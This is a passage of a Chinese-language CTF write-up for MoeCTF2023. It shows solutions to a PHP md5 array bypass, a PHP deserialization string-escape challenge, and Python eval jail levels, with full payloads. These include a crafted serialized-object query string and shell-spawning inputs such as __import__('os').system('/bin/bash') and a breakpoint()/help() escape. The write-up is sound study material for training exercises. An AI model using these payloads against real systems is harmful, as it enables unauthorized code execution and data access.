class="string">&#x27;param2&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$param1</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;param1&#x27;</span>];</span><br><span class="line">    <span class="variable">$param2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;param2&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$param1</span> !== <span class="variable">$param2</span>) &#123;</span><br><span class="line">        </span><br><span class="line">        <span class="variable">$md5Param1</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$param1</span>);</span><br><span class="line">        <span class="variable">$md5Param2</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$param2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$md5Param1</span> == <span class="variable">$md5Param2</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;O.O!! &quot;</span> . <span class="title function_ invoke__">getenv</span>(<span class="string">&quot;FLAG&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;O.o??&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;o.O?&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;O.o?&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>直接访问<code>Fl3g_n0t_Here_dont_peek!!!!!.php</code></p>
+<p>数组绕过即可</p>
+<p><code>?param1[]=a&amp;param2[]=b</code></p>
+<p>(尊嘟假嘟o.O)</p>
+<h2 id="夺命十三枪">夺命十三枪</h2>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&#x27;Hanxin.exe.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$Chant</span> = <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;chant&#x27;</span>]) ? <span class="variable">$_GET</span>[<span class="string">&#x27;chant&#x27;</span>] : <span class="string">&#x27;夺命十三枪&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$new_visitor</span> = <span class="keyword">new</span> <span class="title class_">Omg_It_Is_So_Cool_Bring_Me_My_Flag</span>(<span class="variable">$Chant</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$before</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$new_visitor</span>);</span><br><span class="line"><span class="variable">$after</span> = <span class="title class_">Deadly_Thirteen_Spears</span>::<span class="title function_ invoke__">Make_a_Move</span>(<span class="variable">$before</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;Your Movements: &#x27;</span> . <span class="variable">$after</span> . <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">unserialize</span>(<span class="variable">$after</span>);</span><br><span class="line">&#125;<span class="keyword">catch</span> (<span class="built_in">Exception</span> <span class="variable">$e</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Even Caused A Glitch...&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>先看<code>index.php</code>:</p>
+<p>根据传的参数构造了一个<code>Omg_It_Is_So_Cool_Bring_Me_My_Flag()</code>实例，序列化之后经过<code>Deadly_Thirteen_Spears::Make_a_Move()</code>处理之后再反序列化。</p>
+<p>再看看包含的<code>Hanxin.exe.php</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">basename</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;SCRIPT_FILENAME&#x27;</span>]) === <span class="title function_ invoke__">basename</span>(<span class="keyword">__FILE__</span>)) &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Deadly_Thirteen_Spears</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="built_in">static</span> <span class="variable">$Top_Secret_Long_Spear_Techniques_Manual</span> = <span class="keyword">array</span>(</span><br><span class="line">        <span class="string">&quot;di_yi_qiang&quot;</span> =&gt; <span class="string">&quot;Lovesickness&quot;</span>,</span><br><span class="line">        <span class="string">&quot;di_er_qiang&quot;</span> =&gt; <span class="string">&quot;Heartbreak&quot;</span>,</span><br><span class="line">        <span class="string">&quot;di_san_qiang&quot;</span> =&gt; <span class="string">&quot;Blind_Dragon&quot;</span>,</span><br><span class="line">        <span class="string">&quot;di_si_qiang&quot;</span> =&gt; <span class="string">&quot;Romantic_charm&quot;</span>,</span><br><span class="line">        <span class="string">&quot;di_wu_qiang&quot;</span> =&gt; <span class="string">&quot;Peerless&quot;</span>,</span><br><span class="line">        <span class="string">&quot;di_liu_qiang&quot;</span> =&gt; <span class="string">&quot;White_Dragon&quot;</span>,</span><br><span class="line">        <span class="string">&quot;di_qi_qiang&quot;</span> =&gt; <span class="string">&quot;Penetrating_Gaze&quot;</span>,</span><br><span class="line">        <span class="string">&quot;di_ba_qiang&quot;</span> =&gt; <span class="string">&quot;Kunpeng&quot;</span>,</span><br><span class="line">        <span class="string">&quot;di_jiu_qiang&quot;</span> =&gt; <span class="string">&quot;Night_Parade_of_a_Hundred_Ghosts&quot;</span>,</span><br><span class="line">        <span class="string">&quot;di_shi_qiang&quot;</span> =&gt; <span class="string">&quot;Overlord&quot;</span>,</span><br><span class="line">        <span class="string">&quot;di_shi_yi_qiang&quot;</span> =&gt; <span class="string">&quot;Letting_Go&quot;</span>,</span><br><span class="line">        <span class="string">&quot;di_shi_er_qiang&quot;</span> =&gt; <span class="string">&quot;Decisive_Victory&quot;</span>,</span><br><span class="line">        <span class="string">&quot;di_shi_san_qiang&quot;</span> =&gt; <span class="string">&quot;Unrepentant_Lethality&quot;</span></span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">Make_a_Move</span>(<span class="params"><span class="variable">$move</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">foreach</span>(<span class="built_in">self</span>::<span class="variable">$Top_Secret_Long_Spear_Techniques_Manual</span> <span class="keyword">as</span> <span class="variable">$index</span> =&gt; <span class="variable">$movement</span>)&#123;</span><br><span class="line">            <span class="variable">$move</span> = <span class="title function_ invoke__">str_replace</span>(<span class="variable">$index</span>, <span class="variable">$movement</span>, <span class="variable">$move</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$move</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Omg_It_Is_So_Cool_Bring_Me_My_Flag</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$Chant</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$Spear_Owner</span> = <span class="string">&#x27;Nobody&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$chant</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;Chant = <span class="variable">$chant</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;Spear_Owner = <span class="string">&#x27;Nobody&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;Spear_Owner !== <span class="string">&#x27;MaoLei&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;Far away from COOL...&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Omg You&#x27;re So COOOOOL!!! &quot;</span> . <span class="title function_ invoke__">getenv</span>(<span class="string">&#x27;FLAG&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p><code>Deadly_Thirteen_Spears::Make_a_Move()</code>就是对内容里的文本进行替换，</p>
+<p>输出<code>Omg_It_Is_So_Cool_Bring_Me_My_Flag()</code>的对象时，只要让它的<code>Spear_Owner === 'MaoLei'</code>，就可以获得flag。</p>
+<p>典型的<strong><a
+href="https://qyzy.github.io/2023/05/10/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">反序列化字符逃逸</a>，</strong></p>
+<p>先在本地调一调，找一个好算的。</p>
+<p>从<code>di_yi_qiang</code>到<code>Lovesickness</code>字符增多了一个，需要构造的<code>";s:11:"Spear_Owner";s:6:"MaoLei";&#125;</code>有35个字符，所以payload里要有35个<code>di_yi_qiang</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// $Chant = isset($_GET[&#x27;chant&#x27;]) ? $_GET[&#x27;chant&#x27;] : &#x27;夺命十三枪&#x27;;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// $new_visitor = new Omg_It_Is_So_Cool_Bring_Me_My_Flag($Chant);</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$before</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$new_visitor</span>);</span><br><span class="line"><span class="variable">$after</span> = <span class="title class_">Deadly_Thirteen_Spears</span>::<span class="title function_ invoke__">Make_a_Move</span>(<span class="variable">$before</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;Your Movements: &#x27;</span> . <span class="variable">$after</span> . <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">unserialize</span>(<span class="variable">$after</span>);</span><br><span class="line">&#125;<span class="keyword">catch</span> (<span class="built_in">Exception</span> <span class="variable">$e</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Even Caused A Glitch...&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Deadly_Thirteen_Spears</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="built_in">static</span> <span class="variable">$Top_Secret_Long_Spear_Techniques_Manual</span> = <span class="keyword">array</span>(</span><br><span class="line">        <span class="string">&quot;di_yi_qiang&quot;</span> =&gt; <span class="string">&quot;Lovesickness&quot;</span>,</span><br><span class="line">        <span class="string">&quot;di_er_qiang&quot;</span> =&gt; <span class="string">&quot;Heartbreak&quot;</span>,</span><br><span class="line">        <span class="string">&quot;di_san_qiang&quot;</span> =&gt; <span class="string">&quot;Blind_Dragon&quot;</span>,</span><br><span class="line">        <span class="string">&quot;di_si_qiang&quot;</span> =&gt; <span class="string">&quot;Romantic_charm&quot;</span>,</span><br><span class="line">        <span class="string">&quot;di_wu_qiang&quot;</span> =&gt; <span class="string">&quot;Peerless&quot;</span>,</span><br><span class="line">        <span class="string">&quot;di_liu_qiang&quot;</span> =&gt; <span class="string">&quot;White_Dragon&quot;</span>,</span><br><span class="line">        <span class="string">&quot;di_qi_qiang&quot;</span> =&gt; <span class="string">&quot;Penetrating_Gaze&quot;</span>,</span><br><span class="line">        <span class="string">&quot;di_ba_qiang&quot;</span> =&gt; <span class="string">&quot;Kunpeng&quot;</span>,</span><br><span class="line">        <span class="string">&quot;di_jiu_qiang&quot;</span> =&gt; <span class="string">&quot;Night_Parade_of_a_Hundred_Ghosts&quot;</span>,</span><br><span class="line">        <span class="string">&quot;di_shi_qiang&quot;</span> =&gt; <span class="string">&quot;Overlord&quot;</span>,</span><br><span class="line">        <span class="string">&quot;di_shi_yi_qiang&quot;</span> =&gt; <span class="string">&quot;Letting_Go&quot;</span>,</span><br><span class="line">        <span class="string">&quot;di_shi_er_qiang&quot;</span> =&gt; <span class="string">&quot;Decisive_Victory&quot;</span>,</span><br><span class="line">        <span class="string">&quot;di_shi_san_qiang&quot;</span> =&gt; <span class="string">&quot;Unrepentant_Lethality&quot;</span></span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">Make_a_Move</span>(<span class="params"><span class="variable">$move</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">foreach</span>(<span class="built_in">self</span>::<span class="variable">$Top_Secret_Long_Spear_Techniques_Manual</span> <span class="keyword">as</span> <span class="variable">$index</span> =&gt; <span class="variable">$movement</span>)&#123;</span><br><span class="line">            <span class="variable">$move</span> = <span class="title function_ invoke__">str_replace</span>(<span class="variable">$index</span>, <span class="variable">$movement</span>, <span class="variable">$move</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$move</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Omg_It_Is_So_Cool_Bring_Me_My_Flag</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$Chant</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$Spear_Owner</span> = <span class="string">&#x27;Nobody&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$chant</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;Chant = <span class="variable">$chant</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;Spear_Owner = <span class="string">&#x27;Nobody&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;Spear_Owner !== <span class="string">&#x27;MaoLei&#x27;</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;Far away from COOL...&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Omg You&#x27;re So COOOOOL!!! &quot;</span> . <span class="title function_ invoke__">getenv</span>(<span class="string">&#x27;FLAG&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Omg_It_Is_So_Cool_Bring_Me_My_Flag</span>(<span class="string">&#x27;di_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiang&quot;;s:11:&quot;Spear_Owner&quot;;s:6:&quot;MaoLei&quot;;&#125;&#x27;</span>);</span><br><span class="line"><span class="variable">$a</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line"><span class="variable">$b</span> = <span class="title class_">Deadly_Thirteen_Spears</span>::<span class="title function_ invoke__">Make_a_Move</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$b</span>;</span><br><span class="line"><span class="comment">// O:34:&quot;Omg_It_Is_So_Cool_Bring_Me_My_Flag&quot;:2:&#123;s:5:&quot;Chant&quot;;s:68:&quot;di_yi_qiangdi_yi_qiangdi_yi_qiang&quot;;s:11:&quot;Spear_Owner&quot;;s:6:&quot;MaoLei&quot;;&#125;&quot;;s:11:&quot;Spear_Owner&quot;;s:6:&quot;Nobody&quot;;&#125;</span></span><br><span class="line"><span class="comment">// O:34:&quot;Omg_It_Is_So_Cool_Bring_Me_My_Flag&quot;:2:&#123;s:5:&quot;Chant&quot;;s:68:&quot;LovesicknessLovesicknessLovesickness&quot;;s:11:&quot;Spear_Owner&quot;;s:6:&quot;MaoLei&quot;;&#125;&quot;;s:11:&quot;Spear_Owner&quot;;s:6:&quot;Nobody&quot;;&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// O:34:&quot;Omg_It_Is_So_Cool_Bring_Me_My_Flag&quot;:2:&#123;s:5:&quot;Chant&quot;;s:420:&quot;LovesicknessLovesicknessLovesicknessLovesicknessLovesicknessLovesicknessLovesicknessLovesicknessLovesicknessLovesicknessLovesicknessLovesicknessLovesicknessLovesicknessLovesicknessLovesicknessLovesicknessLovesicknessLovesicknessLovesicknessLovesicknessLovesicknessLovesicknessLovesicknessLovesicknessLovesicknessLovesicknessLovesicknessLovesicknessLovesicknessLovesicknessLovesicknessLovesicknessLovesicknessLovesickness&quot;;s:11:&quot;Spear_Owner&quot;;s:6:&quot;MaoLei&quot;;&#125;&quot;;s:11:&quot;Spear_Owner&quot;;s:6:&quot;Nobody&quot;;&#125;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>最后验证一下，恰好覆盖掉。</p>
+<p>最后payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?chant=di_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiangdi_yi_qiang&quot;;s:11:&quot;Spear_Owner&quot;;s:6:&quot;MaoLei&quot;;&#125;</span><br></pre></td></tr></table></figure>
+<h1 id="jail">Jail</h1>
+<h2 id="jail-level-0">Jail Level 0</h2>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Welcome to the MoeCTF2023 Jail challenge.It&#x27;s time to work on this calc challenge.&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Enter your expression and I will evaluate it for you.&quot;</span>)</span><br><span class="line">user_input_data = <span class="built_in">input</span>(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;calc Answer: &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">eval</span>(user_input_data)))</span><br></pre></td></tr></table></figure>
+<p>直接eval，那我们也直接拿shell</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__import__(&quot;os&quot;).system(&quot;/bin/bash&quot;)</span><br></pre></td></tr></table></figure>
+<h2 id="jail-level-1">Jail Level 1</h2>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Welcome to the MoeCTF2023 Jail challenge level1.It&#x27;s time to work on this calc challenge.&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Enter your expression and I will evaluate it for you.&quot;</span>)</span><br><span class="line">user_input_data = <span class="built_in">input</span>(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(user_input_data)&gt;<span class="number">12</span>:</span><br><span class="line">  <span class="built_in">print</span>(<span class="string">&quot;Oh hacker! Bye~&quot;</span>)</span><br><span class="line">  exit(<span class="number">0</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;calc Answer: &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">eval</span>(user_input_data)))</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>限制了payload长度，这里我们可以使用breakpoint()来进入debug模式，之后就可以不受限制。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; e</span><br><span class="line">Welcome to the MoeCTF2023 Jail challenge.It&#x27;s time to work on this calc challenge.</span><br><span class="line">Enter your expression and I will evaluate it for you.</span><br><span class="line">&gt; breakpoint()</span><br><span class="line">--Return--</span><br><span class="line">&gt; &lt;string&gt;(1)&lt;module&gt;()-&gt;None</span><br><span class="line">(Pdb) __import__(&quot;os&quot;).system(&quot;/bin/bash&quot;)</span><br><span class="line">ls</span><br><span class="line">flag</span><br><span class="line">server.py</span><br><span class="line">cat flag</span><br><span class="line">flag&#123;xxxxxxxxxxxxx&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="jail-level-2">Jail Level 2</h2>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Welcome to the MoeCTF2023 Jail challenge level1.It&#x27;s time to work on this calc challenge.&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Enter your expression and I will evaluate it for you.&quot;</span>)</span><br><span class="line">user_input_data = <span class="built_in">input</span>(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(user_input_data)&gt;<span class="number">6</span>:</span><br><span class="line">  <span class="built_in">print</span>(<span class="string">&quot;Oh hacker! Bye~&quot;</span>)</span><br><span class="line">  exit(<span class="number">0</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;calc Answer: &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">eval</span>(user_input_data)))</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>长度限制更严格了，这里有一个巧妙的办法：</p>
+<p>先用<code>help()</code>进入帮助界面，然后查看内容比较多的文档，比如<code>sys</code>，就会使用<code>more</code>来展示。众所周知，more可以用来执行命令，直接拿shell。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; e</span><br><span class="line">Welcome to the MoeCTF2023 Jail challenge.It&#x27;s time to work on this calc challenge.</span><br><span class="line">Enter your expression and I will evaluate it for you.</span><br><span class="line">&gt; help()</span><br><span class="line"></span><br><span class="line">Welcome to Python 3.10&#x27;s help utility!</span><br><span class="line"></span><br><span class="line">If this is your first time using Python, you should definitely check out</span><br><span class="line">the tutorial on the internet at https://docs.python.org/3.10/tutorial/.</span><br><span class="line"></span><br><span class="line">Enter the name of any module, keyword, or topic to get help on writing</span><br><span class="line">Python programs and using Python modules.  To quit this help utility and</span><br><span class="line">return to the interpreter, just type &quot;quit&quot;.</span><br><span class="line"></span><br><span class="line">To get a list of available modules, keywords, symbols, or topics, type</span><br><span class="line">&quot;modules&quot;, &quot;keywords&quot;, &quot;symbols&quot;, or &quot;topics&quot;.  Each module also comes</span><br><span class="line">with a one-line summary of what it does; to list the modules whose name</span><br><span class="line">or summary contain a given string such as &quot;spam&quot;, type &quot;modules spam&quot;.</span><br><span class="line"></span><br><span class="line">help&gt; sys</span><br><span class="line">WARNING: terminal is not fully functional</span><br><span class="line">Press RETURN to continue </span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<figure>
+<img src="image-20230822143913159.png" alt="image-20230822143913159" />
+<figcaption aria-hidden="true">image-20230822143913159</figcaption>
+</figure>
